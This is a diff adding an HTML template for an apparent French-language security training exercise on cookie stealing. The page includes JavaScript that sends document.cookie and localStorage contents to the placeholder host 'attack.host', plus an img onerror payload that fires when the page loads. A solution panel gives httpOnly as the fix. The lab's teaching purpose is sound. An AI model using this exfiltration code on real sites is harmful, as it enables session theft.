@@ -1,0 +1,67 @@
+{% extends "layout/default.html" %}
+{% block title %}Cookie stealing{% endblock %}
+{% block head %}
+{{ super() }}
+<script>
+  function steal_my_cookie() {
+    cookie = btoa(document.cookie);
+    const img = document.createElement("img");
+    img.setAttribute("src", "http://attack.host/info?q=" + cookie);
+    document.body.appendChild(img);
+  }
+  function steal_my_storage() {
+    storage = btoa(localStorage.getItem('key'));
+    const img = document.createElement("img");
+    img.setAttribute("src", "http://attack.host/info?q=" + storage);
+    document.body.appendChild(img);
+  }
+  function populate_local_storage() {
+    fetch('/random')
+      .then((value) => value.json())
+      .then((value) => localStorage.setItem("key", value.random));
+  }
+  populate_local_storage();
+</script>
+{% endblock %}
+{% block content %}
+<h1>Cookie Stealing</h1>
+
+<p>
+  Votre site a été piraté. Un attaquant a inclus du contenu javascript qui lui permet de voler
+  votre identifiant de session.
+
+  Ouvrez la console de développeur de votre navigateur et observez les requêtes produites
+  lorsque vous cliquez sur les boutons:
+</p>
+
+<button type="button" onclick="steal_my_cookie()">Steal My Cookie!</button>
+
+<button type="button" onclick="steal_my_storage()">Steal My Storage!</button>
+
+<p>
+  Avez-vous remarqué que la récupération se faisait au chargement de la page?
+  <img src=x onerror="steal_my_cookie()" />
+</p>
+
+<p>
+  Corrigez le problème en modifiant la méthode cookie_stealing dans le fichier unsecure.py
+</p>
+
+<div class="accordion" id="accordionExample">
+  <div class="accordion-item">
+    <h2 class="accordion-header" id="headingOne">
+      <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne"
+        aria-expanded="true" aria-controls="collapseOne">
+        Solution
+      </button>
+    </h2>
+    <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        Le paramètre à utiliser est <strong>httpOnly</strong>.
+        Avec cette valeur, le code javascript ne peut plus accéder à document.cookie.
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
